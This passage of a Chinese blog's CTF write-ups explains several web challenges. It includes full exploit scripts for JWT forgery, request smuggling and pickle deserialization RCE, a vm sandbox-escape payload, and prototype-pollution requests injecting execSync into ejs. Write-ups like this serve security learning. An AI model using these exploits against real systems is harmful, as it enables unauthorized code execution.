keyword">if</span> key <span class="token operator">!=</span> <span class="token string">'Host'</span><span class="token punctuation">}</span>                data <span class="token operator">=</span> request<span class="token punctuation">.</span>data                path <span class="token operator">=</span> <span class="token string">"/"</span>                <span class="token keyword">if</span> request<span class="token punctuation">.</span>query_string<span class="token punctuation">:</span>                    path <span class="token operator">+=</span> <span class="token string">"?"</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>query_string<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Transfer-Encoding"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"chunked"</span><span class="token punctuation">:</span>                    data <span class="token operator">=</span> <span class="token string">"{}\r\n{}\r\n0\r\n\r\n"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"BackdoorPasswordOnlyForAdmin"</span> <span class="token operator">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token string">"You are not an admin!"</span>                conn<span class="token punctuation">.</span>request<span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token string">"/backdoor"</span><span class="token punctuation">,</span> body<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">"Done!"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"You are not an admin!"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'HS256'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> options<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"verify_signature"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"Welcome admin!"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"You are not an admin!"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> code<span class="token operator">=</span><span class="token number">302</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是<code>backend</code>不允许带<code>BackdoorPasswordOnlyForAdmin</code>，不带的话才会走反序列化。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">backdoor</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> web<span class="token punctuation">.</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># fix this backdoor</span>        <span class="token keyword">if</span> b<span class="token string">"BackdoorPasswordOnlyForAdmin"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"You are an admin!"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            data  <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"Done!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里观察到<code>web.data()</code>取数据，如果遇到<code>chunked</code>就会把数据全读出来。但是注意到<code>headers.get(&quot;Transfer-Encoding&quot;, &quot;&quot;).lower() == &quot;chunked&quot;:</code>转了个小写，也就是说大写<code>chunKED</code>也会识别成<code>chunked</code>然后包装成分块传输的格式给后端发过去。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714314733205.png" alt="1714314733205"></p><p><code>frontend</code>会把接收到的<code>header</code>原封不动的转发给<code>backend</code>，所以我们设置<code>Transfer-Encoding: chunKed, Content-Length: &#123;len(codeb)&#125;</code>，传输数据<code>payload+BackdoorPasswordOnlyForAdmin</code>。请求到达<code>frontend</code>时会识别到<code>BackdoorPasswordOnlyForAdmin</code>，到了<code>backend</code>因为没有识别到<code>chunked</code>头就会取<code>content-length</code>的长度从而忽略掉后面<code>BackdoorPasswordOnlyForAdmin</code>那一部分。</p><p>注意<code>requests</code>会自动把<code>CL</code>恢复所以不能用<code>requests</code>库。</p><pre class="line-numbers language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"pickle_payload"</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"kid"</span><span class="token punctuation">:</span> <span class="token string">"app.py"</span><span class="token punctuation">}</span>kid <span class="token operator">=</span> <span class="token string">"./app.py"</span>key <span class="token operator">=</span> open<span class="token punctuation">(</span>kid<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>user_info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"squirt1e"</span><span class="token punctuation">,</span> <span class="token string">"isadmin"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">}</span>token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>user_info<span class="token punctuation">,</span> key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"HS256"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"kid"</span><span class="token punctuation">:</span> <span class="token string">"app.py"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>data <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">"BackdoorPasswordOnlyForAdmin"</span>host <span class="token operator">=</span> <span class="token string">"192.168.167.149:8081"</span>raw <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""POST http://{host}/admin HTTP/1.1Host: {host}User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closekid: app.pyTransfer-Encoding: chunKedCookie: token={token}Content-Length: {len(payload)}{hex(len(data))[2:]}{data}0"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>转发到后端就是个<code>pickle</code>反序列化，不过远程是不出网的，需要通过反序列化给<code>backend</code>加一个路由。因为<code>frontend</code>的<code>/backend</code>路由可以代理<code>GET,POST</code>方法方便后面的<code>/index</code>，所以给<code>/index</code>加个路由就可以了。</p><pre class="line-numbers language-python"><code class="language-python">s<span class="token operator">=</span><span class="token triple-quoted-string string">"""def fuck(self):    return __import__('os').popen('ls').read()index.POST=fuck"""</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>exp <span class="token operator">=</span> Exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完整<code>exp</code>如下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> jwt<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64s<span class="token operator">=</span><span class="token triple-quoted-string string">"""def fuck(self):    return __import__('os').popen('ls').read()index.POST=fuck"""</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>exp <span class="token operator">=</span> Exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"kid"</span><span class="token punctuation">:</span> <span class="token string">"app.py"</span><span class="token punctuation">}</span>kid <span class="token operator">=</span> <span class="token string">"./app.py"</span>key <span class="token operator">=</span> open<span class="token punctuation">(</span>kid<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>user_info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"squirt1e"</span><span class="token punctuation">,</span> <span class="token string">"isadmin"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">}</span>token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>user_info<span class="token punctuation">,</span> key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"HS256"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"kid"</span><span class="token punctuation">:</span> <span class="token string">"app.py"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(token)</span>data <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">"BackdoorPasswordOnlyForAdmin"</span>host <span class="token operator">=</span> <span class="token string">"139.224.222.124:30180"</span>raw <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""POST http://{host}/admin HTTP/1.1Host: {host}User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closekid: app.pyTransfer-Encoding: chunKedCookie: token={token}Content-Length: {len(payload)}{hex(len(data))[2:]}{data}0"""</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>raw<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>b<span class="token string">"\n"</span><span class="token punctuation">,</span> b<span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>res <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>raw2 <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""POST http://{host}/backend HTTP/1.1Host: {host}User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closeUpgrade-Insecure-Requests: 1Priority: u=1"""</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>raw2<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>b<span class="token string">"\n"</span><span class="token punctuation">,</span> b<span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>res <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714316944951.png" alt="1714316944951"></p><h4 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack_overflow"></a>stack_overflow</h4><p>这题属于纸老虎，看上去很牛逼实际上很简单。通过<code>eval</code>执行最下面那一串模板代码处理用户输入，其实栈实现的逻辑都不用看懂。直接定位到<code>vm.run</code>，调试到这里发现会把<code>stdin</code>的内容拼接到<code>cmd</code>当中。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714317870295.png" alt="1714317870295"></p><p>所以闭合一下括号打<code>vm1</code>沙箱逃逸就行了。</p><pre><code>&#123;&quot;stdin&quot;:[&quot;0&#39;);const p=this.constructor.constructor(&#39;return this.process&#39;)();p.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&quot;]&#125;</code></pre><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714318185913.png" alt="1714318185913"></p><p>还会贴心的给你回显。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714317251652.jpg" alt="1714317251652"></p><h4 id="moonbox"><a href="#moonbox" class="headerlink" title="moonbox"></a>moonbox</h4><p>是个后台<code>RCE</code>，白盒加黑盒凭借经验体会体会就能定位到洞了。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714318537144.png" alt="1714318537144"></p><p>这里启动流量录制是通过启动一个<code>agent hook</code>源程序之类的操作来实现的，直接定位到<code>startAgent</code>方法。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240428233714040.png" alt="image-20240428233714040"></p><p>最终是到<code>getRemoteAgentStartCommand</code>方法执行了一串命令。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714318296704.jpg" alt="1714318296704"></p><p>总体执行的命令就这些，本地<code>docker</code>得到的命令如下，</p><pre><code>curl -o sandboxDownLoad.tar http://127.0.0.1:8080/api/agent/downLoadSandBoxZipFile &amp;&amp; curl -o moonboxDownLoad.tar http://127.0.0.1:8080/api/agent/downLoadMoonBoxZipFile &amp;&amp; rm -fr ~/sandbox &amp;&amp; rm -fr ~/.sandbox-module &amp;&amp;  tar  -xzf sandboxDownLoad.tar -C ~/ &gt;&gt; /dev/null &amp;&amp; tar  -xzf moonboxDownLoad.tar -C ~/ &gt;&gt; /dev/null &amp;&amp; dos2unix ~/sandbox/bin/sandbox.sh &amp;&amp; dos2unix ~/.sandbox-module/bin/start-remote-agent.sh &amp;&amp; rm -f moonboxDownLoad.tar sandboxDownLoad.tar &amp;&amp; sh ~/.sandbox-module/bin/start-remote-agent.sh moon-box-web rc_id_8683586da5b775c649752ac028f52fbc%26http%3A%2F%2F127.0.0.1%3A8080%26INFO%26INFO</code></pre><p>开始想的是命令注入，但是看了下参数不太好控制。注意到服务端会先请求<code>sandbox</code>和<code>moonbox</code>这两个压缩包并且解压，最终会执行<code>~/.sandbox-module/bin/start-remote-agent.sh</code>。</p><pre><code>sh ~/.sandbox-module/bin/start-remote-agent.sh moon-box-web</code></pre><p>所以我们上传对应格式的压缩包就行了直接反弹<code>shell</code>就行了。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714318821687.png" alt="1714318821687"></p><p>用来<code>RCE</code>的<code>moonbox</code>。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714318888734.png" alt="1714318888734"></p><p>需要注意的一点是它是通过<code>&amp;&amp;</code>执行命令，前面报错就不会执行到<code>start-remote-agent.sh</code>。唯一的坑点就是前面有个<code>dos2unix ~/sandbox/bin/sandbox.sh</code>，所以我们再制作一个包，里面包含<code>sandbox/bin/sandbox.sh</code>，之后传到<code>sandbox</code>就行了。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1714319060915.jpg" alt="1714319060915"></p><h4 id="Doctor"><a href="#Doctor" class="headerlink" title="Doctor"></a>Doctor</h4><p>肯定要进后台，接口有两次鉴权。第一次是访问任意接口都会校验一下<code>jwt</code>头，第二次是访问<code>admin</code>等高权限路由会再次解析识别当前用户是否为<code>admin</code>。</p><p>第一次鉴权找到方法绕过了，第二次的解析看起来不可能绕过。那么就是<code>sql</code>注入了，但是可利用的<code>sql</code>注入没找到。。。</p><p>不过我有个问题，如果是<code>sql</code>注入反查解<code>hash</code>的话那么爆破密码是不是也能进后台。。。为什么爆破了进不去呢。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈ueditor的json注入问题</title>
      <link href="/2024/03/28/qian-tan-ueditor-de-json-zhu-ru-wen-ti/"/>
      <url>/2024/03/28/qian-tan-ueditor-de-json-zhu-ru-wen-ti/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="378cad922014013b432c114a77f90eb8b8f07a684cf48a083f0f92857e46687b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 安全研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Biosctf 2024 writeup</title>
      <link href="/2024/02/28/biosctf2024/"/>
      <url>/2024/02/28/biosctf2024/</url>
      
        <content type="html"><![CDATA[<h4 id="requirenotes"><a href="#requirenotes" class="headerlink" title="requirenotes"></a>requirenotes</h4><h5 id="非预期1"><a href="#非预期1" class="headerlink" title="非预期1"></a>非预期1</h5><p><code>protobufjs</code>有一个原型链污染，后面的<code>revenge</code>也有。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># npm audit report</span>protobufjs  7.0.0 - 7.2.3Severity: criticalprotobufjs Prototype Pollution vulnerability - https://github.com/advisories/GHSA-h755-8qp9-cq85fix available via <span class="token variable"><span class="token variable">`</span><span class="token function">npm</span> audit fix --force<span class="token variable">`</span></span>Will <span class="token function">install</span> protobufjs@7.2.6, <span class="token function">which</span> is outside the stated dependency rangenode_modules/protobufjs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>/create</code>下面正好有一个利用点<code>parse</code>，只要<code>settings.proto</code>可控就能原型链污染了。</p><pre class="line-numbers language-js"><code class="language-js">schema <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./settings.proto'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>root <span class="token operator">=</span> protobuf<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>schema<span class="token punctuation">)</span><span class="token punctuation">.</span>root<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而<code>/customise</code>正好能改<code>settings.proto</code>。<code>author</code>可控，直接在<code>author</code>那里污染写<code>payload</code>就行了。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> <span class="token punctuation">{</span> data <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span><span class="token keyword">let</span> author <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'author'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>author<span class="token punctuation">)</span> <span class="token punctuation">{</span>    protoContents<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token string">`  </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>author<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> string author = 3 [default="user"];`</span></span><span class="token punctuation">;</span><span class="token punctuation">}</span>fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'./settings.proto'</span><span class="token punctuation">,</span> protoContents<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而<code>ejs compile</code>那里有个拼接，可以代码注入。关键在于<code>client</code>和<code>escapeFn</code>默认都是<code>null</code>，所以可以原型链污染覆盖这两个。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>client<span class="token punctuation">)</span> <span class="token punctuation">{</span>  src <span class="token operator">=</span> <span class="token string">'escapeFn = escapeFn || '</span> <span class="token operator">+</span> escapeFn<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>compileDebug<span class="token punctuation">)</span> <span class="token punctuation">{</span>    src <span class="token operator">=</span> <span class="token string">'rethrow = rethrow || '</span> <span class="token operator">+</span> rethrow<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以第一次污染<code>client</code>，提交一下<code>note</code>触发污染。</p><pre class="line-numbers language-http"><code class="language-http">POST /customise HTTP/1.1<span class="token header-name keyword">Host:</span> ch1581141629.ch.eng.run<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Encoding:</span> identity<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9<span class="token header-name keyword">Content-Length:</span> 53<span class="token header-name keyword">Content-Type:</span> application/json<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36<span class="token application/json"><span class="token punctuation">{</span><span class="token string">"data"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"title"</span><span class="token punctuation">:</span><span class="token string">"required"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"author"</span><span class="token punctuation">:</span><span class="token string">"option(a).constructor.prototype.client=1;\n required"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二次污染<code>escapeFunction</code>，随便访问页面触发<code>ejs</code>渲染，没回显额外打个回显就行了。</p><pre class="line-numbers language-http"><code class="language-http">POST /customise HTTP/1.1<span class="token header-name keyword">Host:</span> ch1581141629.ch.eng.run<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Encoding:</span> identity<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9<span class="token header-name keyword">Content-Length:</span> 31<span class="token header-name keyword">Content-Type:</span> application/json<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36<span class="token application/json"><span class="token punctuation">{</span><span class="token string">"data"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"title"</span><span class="token punctuation">:</span><span class="token string">"required"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"author"</span><span class="token punctuation">:</span><span class="token string">"option(a).constructor.prototype.escapeFunction=\"escapeFn;__output=global.process.mainModule.require('child_process').execSync('env').toString();return __output\";\n required"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1709104937652.png" alt="1709104937652"></p><p>PS：</p><p>这里<code>settings[&#39;view options&#39;]</code>如果存在的话会拷贝到<code>opts</code>中。但是<code>view 